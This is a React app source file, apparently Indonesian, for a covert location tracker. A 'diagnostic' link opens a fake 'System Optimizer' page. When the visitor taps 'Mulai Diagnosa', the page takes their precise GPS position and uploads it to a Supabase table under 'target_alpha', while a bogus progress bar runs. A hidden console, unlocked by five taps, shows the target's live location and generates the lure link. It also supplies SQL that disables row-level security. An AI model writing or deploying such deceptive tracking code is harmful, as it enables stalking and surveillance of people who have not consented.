
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [config, setConfig] = useState({
    url: localStorage.getItem('SB_URL_OVERRIDE') || process.env.SUPABASE_URL || '',
    key: localStorage.getItem('SB_KEY_OVERRIDE') || process.env.SUPABASE_KEY || ''
  });

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagProgress, setDiagProgress] = useState(0);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  const [showConfigEditor, setShowConfigEditor] = useState(false);
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];
  const isConfigValid = !!config.url && !!config.key;

  // Memoize client agar tidak re-init terus menerus
  const supabase = useMemo(() => {
    if (config.url && config.key) {
      try { return createClient(config.url, config.key); } catch (e) { return null; }
    }
    return null;
  }, [config]);

  const syncToDatabase = async (loc: LocationData) => {
    if (!supabase) { setDbLog("ERR: NO_CONFIG"); return; }
    
    setDbLog("CONNECTING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ 
          id: targetId, 
          latitude: loc.latitude, 
          longitude: loc.longitude, 
          accuracy: loc.accuracy, 
          timestamp: loc.timestamp 
        });
      
      if (error) {
        console.error("Supabase Error:", error);
        setDbLog(`DB_ERR: ${error.code || 'UNKNOWN'}`); 
      } else {
        setDbLog("SUCCESS: DATA_SENT");
      }
    } catch (err) {
      setDbLog("NETWORK_FAIL");
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('live-track')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode, supabase]);

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setDbLog("GPS_NOT_SUPPORTED");
      return;
    }
    
    setDbLog("GETTING_GPS...");
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };
        
        if (isStealthMode) {
          await syncToDatabase(newLocation);
        }
        
        if (isUnlocked && !isStealthMode) {
          setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
          // Opsi: Kirim data admin ke DB untuk tes
          await syncToDatabase(newLocation);
        }
      },
      (err) => {
        console.error("GPS Error:", err);
        if (err.code === 1) setDbLog("GPS_DENIED");
        else if (err.code === 2) setDbLog("GPS_UNAVAILABLE");
        else if (err.code === 3) setDbLog("GPS_TIMEOUT");
        else setDbLog("GPS_ERROR");
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode, supabase]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    updateLocation();
    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 40);
  };

  const saveManualConfig = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const url = (formData.get('url') as string).trim();
    const key = (formData.get('key') as string).trim();
    localStorage.setItem('SB_URL_OVERRIDE', url);
    localStorage.setItem('SB_KEY_OVERRIDE', key);
    setConfig({ url, key });
    setShowConfigEditor(false);
    window.location.reload(); 
  };

  const sqlCode = `-- 1. RESET TABEL\nDROP TABLE IF EXISTS tracking;\n\n-- 2. BUAT ULANG\nCREATE TABLE tracking (\n  id TEXT PRIMARY KEY,\n  latitude FLOAT8,\n  longitude FLOAT8,\n  accuracy FLOAT8,\n  timestamp BIGINT\n);\n\n-- 3. MATIKAN KEAMANAN (RLS)\nALTER TABLE tracking DISABLE ROW LEVEL SECURITY;\n\n-- 4. AKTIFKAN REALTIME\nALTER publication supabase_realtime ADD TABLE tracking;`;

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
        <div className="max-w-md w-full space-y-8 animate-in fade-in">
           <div className="text-center space-y-2">
              <i className="fas fa-microchip text-blue-500 text-4xl mb-4"></i>
              <h1 className="text-xl font-bold uppercase tracking-widest">System Optimizer v1.4</h1>
              <p className="text-[10px] text-slate-500 uppercase tracking-widest">Device Diagnostic Tool</p>
           </div>
           {!isDiagnosing ? (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl">
                <p className="text-slate-400 text-xs leading-relaxed">Pindai integritas hardware, kesehatan baterai, dan kalibrasi sensor GPS untuk performa sistem maksimal.</p>
                <button onClick={startDiagnostic} className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xs shadow-lg shadow-blue-600/20 active:scale-95 transition-all uppercase">Mulai Diagnosa</button>
             </div>
           ) : (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6">
                <div className="space-y-2">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500"><span>Memproses...</span><span>{diagProgress}%</span></div>
                   <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden"><div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div></div>
                </div>
                <div className="bg-black/40 p-4 rounded-xl space-y-2 text-[9px] uppercase tracking-tighter">
                   <div className="flex justify-between"><span className="text-slate-500">Database_Link</span><span className={`font-bold ${dbLog.includes('SUCCESS') ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span></div>
                   <div className="flex justify-between"><span className="text-slate-500">GPS_Sensor</span><span className="text-emerald-500">{diagProgress > 30 ? 'VERIFIED' : 'SCANNING'}</span></div>
                   <div className="flex justify-between"><span className="text-slate-500">Core_Temp</span><span className="text-emerald-500">OPTIMAL</span></div>
                </div>
                {diagProgress >= 100 && (
                   <div className="space-y-4">
                      <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                         <p className="text-[10px] text-emerald-500 font-bold uppercase">Diagnosa Selesai. Sistem Dioptimalkan.</p>
                      </div>
                      <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
                   </div>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-[10px] font-bold tracking-widest text-slate-400 uppercase">{isUnlocked ? '> ADM_CONSOLE_ACTIVE' : '> SYSTEM_RESTRICTED'}</h2>
          </div>
          <div className="flex items-center gap-4">
            {isUnlocked && (
              <>
                <div className={`px-2 py-1 rounded border text-[9px] uppercase font-bold flex items-center gap-2 ${isConfigValid ? 'border-emerald-500/30 bg-emerald-500/5 text-emerald-500' : 'border-rose-500/30 bg-rose-500/5 text-rose-500'}`}>
                  <div className={`w-1.5 h-1.5 rounded-full ${isConfigValid ? 'bg-emerald-500' : 'bg-rose-500 animate-pulse'}`}></div>
                  DB_{isConfigValid ? 'LINKED' : 'OFFLINE'}
                </div>
                <button onClick={() => setShowConfigEditor(true)} className="p-2 text-slate-500 hover:text-white transition-colors"><i className="fas fa-cog"></i></button>
              </>
            )}
          </div>
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-md mx-auto py-20 text-center space-y-6 animate-in fade-in duration-700">
               <div className="w-16 h-16 bg-slate-900 border border-slate-800 rounded-2xl flex items-center justify-center mx-auto shadow-2xl"><i className="fas fa-fingerprint text-slate-700 text-2xl"></i></div>
               <h1 className="text-xl font-bold text-slate-400 uppercase tracking-widest">Otorisasi Diperlukan</h1>
               <p className="text-slate-500 text-xs leading-relaxed">Sistem terenkripsi. Ketuk nomor versi di pojok kiri bawah sebanyak 5 kali.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
              <div className="lg:col-span-2 space-y-6">
                
                {/* Panel Test Connection */}
                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
                   <div className="flex justify-between items-center mb-6">
                      <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest">Debug & Setup</h3>
                      <div className="flex gap-2">
                        <span className="px-3 py-1 bg-black rounded text-[9px] text-blue-400 font-bold border border-blue-900">LOG: {dbLog}</span>
                      </div>
                   </div>
                   <div className="grid grid-cols-2 gap-4">
                      <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
                         <p className="text-[10px] text-slate-500 uppercase mb-4">Langkah 1: Sync Tabel</p>
                         <button onClick={() => { navigator.clipboard.writeText(sqlCode); setCopyStatus('sql'); setTimeout(() => setCopyStatus(null), 2000); }} className="w-full py-3 bg-blue-600/10 border border-blue-600/30 text-blue-400 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600/20 transition-all">
                            {copyStatus === 'sql' ? 'Copied SQL' : 'Copy SQL Setup'}
                         </button>
                      </div>
                      <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
                         <p className="text-[10px] text-slate-500 uppercase mb-4">Langkah 2: Tes Koneksi</p>
                         <button onClick={updateLocation} className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-[10px] font-bold uppercase shadow-lg shadow-emerald-600/20 transition-all">
                            Kirim Lokasi Saya
                         </button>
                      </div>
                   </div>
                   <p className="mt-6 text-[10px] text-slate-600 italic">Klik "Kirim Lokasi Saya" untuk mencoba mengisi database secara manual. Jika "LOG" berubah jadi SUCCESS, maka database sudah bekerja.</p>
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
                   <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">Link Diagnosa Target</h3>
                   <div className="flex gap-2 p-2 bg-slate-950 rounded-2xl border border-slate-800">
                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-transparent px-4 text-[11px] text-slate-400 focus:outline-none" />
                      <button onClick={() => {
                        navigator.clipboard.writeText(`${getCleanUrl()}?mode=diagnostic`);
                        setCopyStatus('link');
                        setTimeout(() => setCopyStatus(null), 2000);
                      }} className={`px-8 py-3 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all ${copyStatus === 'link' ? 'bg-emerald-600' : 'bg-slate-800 hover:bg-slate-700'}`}>
                         {copyStatus === 'link' ? 'Berhasil' : 'Copy Link'}
                      </button>
                   </div>
                </div>
              </div>

              <div className="lg:col-span-1">
                <LocationCard member={activeMember} insight={insight} loadingInsight={isLoadingInsight} />
              </div>
            </div>
          )}
        </div>
      </main>

      {showConfigEditor && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 z-50">
           <div className="bg-slate-900 border border-slate-800 w-full max-w-md rounded-3xl p-8 space-y-6 shadow-2xl animate-in zoom-in-95">
              <div className="flex justify-between items-center">
                 <h2 className="text-sm font-bold uppercase tracking-widest text-white">Config Editor</h2>
                 <button onClick={() => setShowConfigEditor(false)} className="text-slate-500 hover:text-white"><i className="fas fa-times"></i></button>
              </div>
              <form onSubmit={saveManualConfig} className="space-y-4">
                 <div className="space-y-1">
                    <label className="text-[9px] text-slate-500 uppercase font-bold">Supabase URL</label>
                    <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs text-slate-300 focus:border-blue-500 focus:outline-none" required />
                 </div>
                 <div className="space-y-1">
                    <label className="text-[9px] text-slate-500 uppercase font-bold">Supabase Anon Key</label>
                    <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs text-slate-300 h-24 focus:border-blue-500 focus:outline-none resize-none" required />
                 </div>
                 <div className="pt-2 flex gap-3">
                    <button type="button" onClick={() => { localStorage.removeItem('SB_URL_OVERRIDE'); localStorage.removeItem('SB_KEY_OVERRIDE'); window.location.reload(); }} className="flex-1 py-3 border border-slate-800 rounded-xl text-[10px] font-bold uppercase text-slate-500 hover:bg-slate-800">Reset</button>
                    <button type="submit" className="flex-1 py-3 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase text-white shadow-lg">Save & Reload</button>
                 </div>
              </form>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;
